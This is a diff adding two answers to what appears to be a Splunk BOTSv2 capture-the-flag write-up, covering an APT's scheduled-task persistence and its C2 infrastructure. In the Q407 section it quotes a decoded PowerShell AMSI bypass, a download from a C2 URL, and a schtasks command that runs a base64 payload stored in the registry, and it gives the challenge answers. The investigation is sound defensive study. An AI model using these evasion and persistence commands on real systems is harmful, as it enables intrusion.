@@ -1172,8 +1172,133 @@ index=botsv2  dest_port="53" sourcetype="stream:dns"   (dest_ip="216.69.185.42" 
 ```
 
 
+<img width="1836" height="421" alt="image" src="https://github.com/user-attachments/assets/a79eb0cb-4e0e-458b-b0ec-138ab704f7bc" />
 
 
 **Answer: 3.6**
 
 
+### **Q407**
+
+To maintain persistence in the Frothly network, Taedonggang APT configured several Scheduled Tasks to beacon back to their C2 server. What single webpage is most contacted by these Scheduled Tasks? Answer guidance: Remove the path and type a single value with an extension. Answer example: index.php or images.html 
+
+
+#### **Approach**
+
+
+I needed to find the scheduled tasks run by the APT but before that, I wanted to focus on the workstations they ran on as to narrow down the investigation.  
+
+
+```
+index=botsv2  sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational" "invoice.doc"
+```
+
+
+<img width="1885" height="671" alt="image" src="https://github.com/user-attachments/assets/1297ec81-01ab-4033-8172-7e0d2e64d8de" />
+
+
+One of the hosts was wrk-btun.
+
+
+```
+index=botsv2  sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational" "schtasks" host="wrk-btun"
+| stats count by ProcessId ParentProcessId cmdline ParentCommandLine
+```
+
+
+<img width="1882" height="778" alt="image" src="https://github.com/user-attachments/assets/bd7de48b-0b2d-407c-b7ca-08ee285cb4c4" />
+
+
+Saw the base64 encoded powershell command and decoded it in cyberchef.
+
+
+PowerShell's -EncodedCommand does not use plain Base64 → ASCII/UTF-8 and it uses Base64-encoded UTF-16 Little Endian (UTF-16LE).
+
+
+
+<img width="951" height="742" alt="image" src="https://github.com/user-attachments/assets/81d4ed13-bab1-4117-8c9a-b370744c4a55" />
+
+
+
+`[ReF].AssEmBLY.GEtTyPE('System.Management.Automation.AmsiUtils')`
+
+`AmsiUtils is the class the engine uses to talk to AMSI (Windows' Antimalware Scan Interface)`
+
+`$_.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`
+
+
+amsInitFailed was set to true making powershell assumes the AMSI engine failed to scan the blocks of scripts. This is an evasion tactic.
+
+
+`$wc.HeadERs.ADd("Cookie","session=lrtRHKkA6IL5h/d8Ekk6QsxyPvk=");`
+
+`$ser='https://45.77.65.211:443';$t='/admin/get.php';$DATA=$WC.DoWNLoaDDATA($SER+$T);`
+
+
+The attacker added the cookie connecting to their server "https://45.77.65.211:443" and used https connection to encrypt their connection not to be detected easily.
+
+
+The uri was '/admin/get.php' and it's child CommandLine events, `C:\Windows\system32\schtasks.exe"  /Create /F /RU system /SC DAILY /ST 10:26 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\"`, were the ones ran from the server after being connected. 
+
+
+The attacker created a scheduled task called Updater daily at 10:26 to run the payloads from the registry 'HKLM:\Software\Microsoft\Network debug' for the persistence mechanism.
+
+
+From this, we could conclude that the victim machine first connected to the 'https://45.77.65.211:443/admin/get.php/' url, ran the payloads from the C2 connection to create the registry and run scheduled task commands creating the 'Updater' task that ran the powershell command. 
+
+The command decoded and ran the payloads in base64 format from the registry value 'debug'.
+
+Dived into the registry logs.
+
+
+```
+index=botsv2 sourcetype=WinRegistry "Software\\Microsoft\\Network"
+|stats count by data
+```
+
+
+<img width="1887" height="558" alt="image" src="https://github.com/user-attachments/assets/f6130a4a-3dd9-482d-84da-c2f429c34892" />
+
+
+<img width="1527" height="793" alt="image" src="https://github.com/user-attachments/assets/44e2a193-d03d-4315-860c-71e1f570a07d" />
+
+
+<img width="1521" height="715" alt="image" src="https://github.com/user-attachments/assets/211aae5a-0931-4ed2-b0da-a5738b8690ee" />
+
+
+'/login/process.php' had the two counts and the other endpoints were '/admin/get.php' and '/new.php' having one count each. 
+
+
+**Answer: process.php**
+
+
+### **Q408** 
+
+
+The APT group Taedonggang is always building more infrastructure to attack future victims. Provide the IPV4 IP address of a Taedonggang controlled server that has a completely different first octet to other Taedonggang controlled infrastructure. Answer guidance: 4.4.4.4 has a different first octet than 8.4.4.4
+
+
+#### **Approach**
+
+
+Knowing the hash of ssl certificates used in their C2 servers would give the information about another controlled servers as attackers would likely use the same ssl certificate for their malware beaconing or connecting their C2. 
+
+
+```
+index=botsv2  sourcetype="stream:tcp" "45.77.65.211" "ssl"
+| stats count by ssl_cert_md5
+```
+
+<img width="1880" height="353" alt="image" src="https://github.com/user-attachments/assets/20b073d7-55a2-41ae-8aab-21829c293dcf" />
+
+
+671DFE1D4F15C5A05F21DDB66D3B7815
+
+searched it at https://platform.censys.io but there was no data found for that. platform.censysio is a migrated one. The old data would have been lost. Google has the answer.
+
+
+**Answer: 104.238.159.19**
+
+
+
+## **Series 4xx**
